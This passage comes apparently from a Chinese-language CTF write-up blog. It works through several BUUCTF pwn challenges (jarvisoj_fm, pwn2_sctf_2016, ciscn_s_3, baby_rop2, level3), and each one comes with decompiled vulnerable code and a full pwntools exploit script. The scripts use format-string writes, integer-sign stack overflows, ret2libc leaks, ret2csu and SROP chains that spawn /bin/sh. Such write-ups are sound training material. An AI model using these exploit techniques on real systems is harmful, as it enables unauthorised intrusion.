class="line"></span><br><span class="line">ru(<span class="string">&quot;[+]Please input the length of your name:&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">backdoor = <span class="number">0x0000000000400726</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">16</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">8</span> + p64(backdoor)</span><br><span class="line">ru(<span class="string">&quot;[+]What&#x27;s u name?&quot;</span>)</span><br><span class="line">sd(payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>main函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">80</span>]; <span class="comment">// [esp+2Ch] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+7Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  be_nice_to_people();</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(buf);                                  <span class="comment">// 格式化字符串漏洞</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d!\n&quot;</span>, x);</span><br><span class="line">  <span class="keyword">if</span> ( x == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;running sh...&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单的格式化字符串漏洞，思路有很多，这里由于没有开启pie，所以可以将<code>x</code>处的值写成<code>4</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  jarvisoj_fm ./fm</span><br><span class="line">aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p</span><br><span class="line">aaaa-0xffb5db9c-0x50-0xf7ee35ec-0xf7f2a942-0xf7fc7c30-(nil)-0xffb5dc94-(nil)-(nil)-0x2f-0x61616161-0x2d70252d-0x252d7025-0x70252d70</span><br><span class="line">3!</span><br></pre></td></tr></table></figure><p>可以看到我们输入的参数在第11个</p><h4 id="EXP-18"><a href="#EXP-18" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Debug</span>(<span class="params">p, breakpoints</span>):</span></span><br><span class="line">    gdb.attach(p, breakpoints)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./fm&quot;</span>)</span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:27208&quot;</span>)</span><br><span class="line">rv =<span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> x: p.recvline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x: p.sendafter(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x: p.sendlineafter(x)</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">x = <span class="number">0x804A02C</span></span><br><span class="line">payload = p32(x) + <span class="string">b&quot;%11$n&quot;</span></span><br><span class="line">sd(payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>漏洞函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">32</span>]; <span class="comment">// [esp+1Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> a2; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;How many bytes do you want me to read? &quot;</span>);</span><br><span class="line">  get_n(nptr, <span class="number">4u</span>);</span><br><span class="line">  a2 = atoi(nptr);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)a2 &lt;= <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Ok, sounds good. Give me %u bytes of data!\n&quot;</span>, a2);</span><br><span class="line">    get_n(nptr, a2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You said: %s\n&quot;</span>, nptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No! That size (%d) is too large!\n&quot;</span>, a2);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>atoi</code>函数会返回一个unsigned int值，但v2为int类型，因此输入负数也可以过<code>v2 &gt; 32</code>的检查，那么就会导致下面<code>get_n</code>栈溢出</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  pwn2_sctf_2016 ./pwn2_sctf_2016 </span><br><span class="line">How many bytes do you want me to read? -1</span><br><span class="line">Ok, sounds good. Give me 4294967295 bytes of data!</span><br></pre></td></tr></table></figure><p>那么就可以通过栈溢出来泄露libc版本和地址，来算出<code>system</code>和<code>/bin/sh</code>的地址</p><h4 id="EXP-19"><a href="#EXP-19" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Debug</span>(<span class="params">p, breakpoints</span>):</span></span><br><span class="line">    gdb.attach(p, breakpoints)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn2_sctf_2016&quot;</span>)</span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:27713&quot;</span>)</span><br><span class="line">rv =<span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> x: p.recvline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x: p.sendafter(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x: p.sendlineafter(x)</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;How many bytes do you want me to read?&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">ru(<span class="string">&quot;Ok, sounds good. Give me 4294967295 bytes of data!&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn2_sctf_2016&quot;</span>)</span><br><span class="line">lib = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">formatstr_addr = <span class="built_in">next</span>(elf.search(<span class="string">b&quot;%s&quot;</span>))</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0x2C</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">4</span> + p32(printf_plt) + p32(main_addr) + p32(formatstr_addr) + p32(printf_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">ru(<span class="string">&quot;You said: &quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_addr = u32(ru(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line">log.success(<span class="string">f&quot;printf_addr =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(printf_addr)&#125;</span>&quot;</span>)</span><br><span class="line">lib.address = printf_addr - lib.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;lib.address =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(lib.address)&#125;</span>&quot;</span>)</span><br><span class="line">system_addr = lib.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">str_bin_sh = <span class="built_in">next</span>(lib.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0x2C</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">4</span> + p32(system_addr) + p32(system_addr) + p32(str_bin_sh)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;How many bytes do you want me to read?&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">ru(<span class="string">&quot;Ok, sounds good. Give me 4294967295 bytes of data!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="ciscn-s-3"><a href="#ciscn-s-3" class="headerlink" title="ciscn_s_3"></a>ciscn_s_3</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>vuln函数存在栈溢出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = sys_read(<span class="number">0</span>, buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> sys_write(<span class="number">1u</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gadgets函数</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211105173212597.png" alt="image-20211105173212597"></p><p>本题存在两种思路</p><ul><li>思路1: 通过系统调用59对应的<code>execve</code>， 构造<code>rop</code>链执行<code>execve(&quot;/bin/sh&quot;, 0, 0)</code></li><li>思路2: 通过系统调用15对应的<code>sys_rt_sigreturn</code>, 借助<code>sigreturn frame</code>来执行<code>system(&quot;/bin/sh&quot;)</code></li></ul><h4 id="EXP1-2"><a href="#EXP1-2" class="headerlink" title="EXP1"></a>EXP1</h4><p>由于题目中没有给出<code>/bin/sh</code>， 所以我们需要先写到栈里，并算出来地址，通过调试可知</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211106164516627.png" alt="image-20211106164516627"></p><p><code>0x7ffd310e25d0存放</code>着一处栈地址, 且此处距离<code>/bin/sh\x00</code>的距离为<code>0x00007ffd310e26c8  - 0x7ffd310e25b0 = 0x118</code>, 这个偏移是固定的，则我们就获得了<code>/bin/sh</code>的地址。接着就可以用<code>ret2csu</code>构造攻击链</p><p>根据64位调用约定，我们还需要一个<code>pop rdi</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211106165232884.png" alt="image-20211106165232884"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line"><span class="comment"># context.log_level = &quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Debug</span>(<span class="params">p, breakpoints</span>):</span></span><br><span class="line">    gdb.attach(p, breakpoints)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./ciscn_s_3&quot;</span>)</span><br><span class="line"><span class="comment"># p = Remote(&quot;node4.buuoj.cn:28906&quot;)</span></span><br><span class="line">rv =<span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> x: p.recvline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x: p.sendafter(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x: p.sendlineafter(x)</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x00000000004004ED</span></span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span> + <span class="string">b&quot;A&quot;</span> * <span class="number">8</span> + p64(vuln_addr)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x118</span></span><br><span class="line">rv(<span class="number">32</span>)</span><br><span class="line">sh_addr = u64(rv(<span class="number">8</span>)) - offset</span><br><span class="line">log.success(<span class="string">f&quot;sh_addr =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(sh_addr)&#125;</span>&quot;</span>)</span><br><span class="line">execv_addr = <span class="number">0x00000000004004E2</span></span><br><span class="line">syscall_ret = <span class="number">0x0000000000400517</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004005a3</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span>.ljust(<span class="number">16</span>, <span class="string">b&quot;A&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15</span>):</span></span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    csu_front_addr = <span class="number">0x0000000000400580</span></span><br><span class="line">    csu_end_addr = <span class="number">0x000000000040059A</span></span><br><span class="line">    payload += p64(csu_end_addr)</span><br><span class="line">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line"></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">0</span>, sh_addr + <span class="number">0x50</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">payload += p64(execv_addr)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(sh_addr) + p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h4 id="EXP2-2"><a href="#EXP2-2" class="headerlink" title="EXP2"></a>EXP2</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Debug</span>(<span class="params">p, breakpoints</span>):</span></span><br><span class="line">    gdb.attach(p, breakpoints)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./ciscn_s_3&quot;</span>)</span><br><span class="line"><span class="comment"># p = Remote()</span></span><br><span class="line">rv =<span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> x: p.recvline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x: p.sendafter(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x: p.sendlineafter(x)</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">sigreturn = <span class="number">0x0000000004004DA</span></span><br><span class="line">vuln_addr = <span class="number">0x00000000004004F1</span></span><br><span class="line">system_ret = <span class="number">0x0000000000400517</span></span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span> + <span class="string">b&quot;A&quot;</span> * <span class="number">0x8</span> + p64(vuln_addr)</span><br><span class="line">sd(payload)</span><br><span class="line">rv(<span class="number">32</span>)</span><br><span class="line">sh_addr = u64(rv(<span class="number">8</span>)) - <span class="number">0x118</span></span><br><span class="line">rv(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = sh_addr</span><br><span class="line">sigframe.rsi = <span class="number">0</span></span><br><span class="line">sigframe.rdx = <span class="number">0</span></span><br><span class="line">sigframe.rip = system_call</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0x10</span> + p64(sigreturn) + p64(system_ret) + <span class="built_in">bytes</span>(sigframe)</span><br><span class="line">sd(payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>main函数中存在栈溢出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">28</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s your name? &quot;</span>);</span><br><span class="line">  v5 = read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  buf[v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the Pwn World again, %s!\n&quot;</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>溢出泄露<code>__libc_start_main</code> 的地址，从而算出<code>libc</code>的基地址，因为 <code>printf</code>需要<code>%s</code>, 所以我们需要<code>pop rdi</code>与<code>pop rsi</code></p><h4 id="EXP-20"><a href="#EXP-20" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Debug</span>(<span class="params">p, breakpoints</span>):</span></span><br><span class="line">    gdb.attach(p, breakpoints)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./babyrop2&quot;</span>)</span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:29412&quot;</span>)</span><br><span class="line">rv =<span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x: p.sendafter(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x: p.sendlineafter(x)</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400733</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0000000000400731</span></span><br><span class="line">format_str = <span class="number">0x0000000000400790</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./babyrop2&quot;</span>)</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">libc_start_main_addr = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">lib = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># Debug(p, &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># b *0x00000000004006CB</span></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;)</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0x20</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">0x8</span> + p64(pop_rdi_ret) + p64(format_str) + p64(pop_rsi_r15_ret) + p64(libc_start_main_addr) + p64(<span class="number">0</span>) + p64(printf_plt) + p64(main_addr)</span><br><span class="line">ru(<span class="string">&quot;What&#x27;s your name? &quot;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">__libc_start_main_addr = u64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lib.address = __libc_start_main_addr - lib.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;lib.address =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(lib.address)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = lib.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">str_bin_sh = <span class="built_in">next</span>(lib.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0x20</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">0x8</span> + p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system_addr)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>存在栈溢出漏洞，通过泄露地址从而算出libc基址，从而getshell</p><h4 id="EXP-21"><a href="#EXP-21" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> sendfile</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Debug</span>(<span class="params">p, breakpoints</span>):</span></span><br><span class="line">    gdb.attach(p, breakpoints)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./level3&quot;</span>)</span><br><span class="line">p = Remote(<span 